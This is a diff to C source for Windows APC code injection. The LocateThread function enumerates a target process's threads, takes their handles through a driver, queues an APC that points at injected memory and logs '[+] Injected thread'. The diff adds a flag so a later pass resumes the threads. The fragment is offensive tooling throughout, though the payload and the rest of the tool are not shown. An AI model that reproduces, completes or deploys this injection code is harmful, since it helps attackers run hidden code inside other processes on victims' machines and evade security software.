@@ -40,7 +40,8 @@ DWORD LocateThread(
   HANDLE hDriver,
   DWORD dwProcId,
   LPVOID pMemory,
-  LPVOID pParam
+  LPVOID pParam,
+  BOOL ResetThreads
 )
 {
   HANDLE hThrdSnap;
@@ -62,23 +63,19 @@ DWORD LocateThread(
     
     if ( dwProcId == pThrd32.th32OwnerProcessID )
     {
+
       HANDLE hThread = NULL;
 
-      AcquireThread(hDriver, &pThrd32.th32ThreadID,
-		   &hThread);
+      AcquireThread(hDriver, &pThrd32.th32ThreadID, &hThread);
 
-      SuspendThread(hThread);
-
-      QueueUserAPC(
-	(PAPCFUNC)pMemory,
-	(HANDLE)hThread,
-	(LPVOID)pParam
-      );
-
-      printf("[+] Injected thread %i\n", pThrd32.th32ThreadID);
-
-      ResumeThread(hThread);
-
+      if ( ResetThreads != TRUE ) { 
+        QueueUserAPC((PAPCFUNC)pMemory, (HANDLE)hThread, 
+		      (ULONG_PTR)pParam);
+        printf("[+] Injected thread %i\n", pThrd32.th32ThreadID);
+      } else {
+	printf("[+] Resumed thread %i\n", pThrd32.th32ThreadID);
+	ResumeThread(hThread);
+      };
       CloseHandle(hThread);
     };
   } while ( Thread32Next(hThrdSnap, &pThrd32) );
